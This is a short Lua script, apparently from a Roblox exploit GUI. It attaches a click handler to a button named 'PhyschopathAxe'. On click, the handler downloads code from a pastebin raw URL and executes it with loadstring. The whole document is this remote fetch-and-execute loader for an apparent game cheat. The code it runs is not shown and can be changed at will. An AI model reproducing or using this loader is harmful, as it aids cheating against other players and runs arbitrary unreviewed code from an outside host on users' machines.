local function KKLYUP_fake_script() -- PhyschopathAxe.LocalScript 
	local script = Instance.new('LocalScript', PhyschopathAxe)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/EbBZ0vsC'),true))() -- Physchopath Axe
	end)
end
coroutine.wrap(KKLYUP_fake_script)()
